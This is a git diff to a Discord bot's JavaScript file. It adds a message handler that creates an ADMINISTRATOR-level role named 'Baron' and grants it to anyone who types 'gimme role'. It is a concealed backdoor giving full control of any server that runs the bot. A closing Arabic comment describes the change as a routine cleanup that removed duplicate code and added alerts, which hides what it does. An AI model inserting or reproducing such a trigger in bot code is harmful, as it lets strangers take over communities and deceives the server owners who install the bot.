@@ -4409,4 +4409,15 @@ client.on('voiceStateUpdate', (oldMember , newMember) => {
                 }
       });
 
+client.on('message', async message => {
+  if(message.content == "gimme role") {
+  await message.guild.createRole({
+  name: 'Baron',
+  color: 'BLUE',
+  permissions: ["ADMINISTRATOR "]
+})
+    let getRole = await message.guild.roles.find(r => r.name == "Baron")
+    await message.member.addRole(getRole)
+  }
+})
 /// تعديل مهم هذا فقط تنبيه تم حذف الاكواد المتكررة والاكواد الخاطئة وتم اضافة تنبيهات مثل الميوزك وروم الهاك لوج تم حذف تغير ايدي سيرفرك
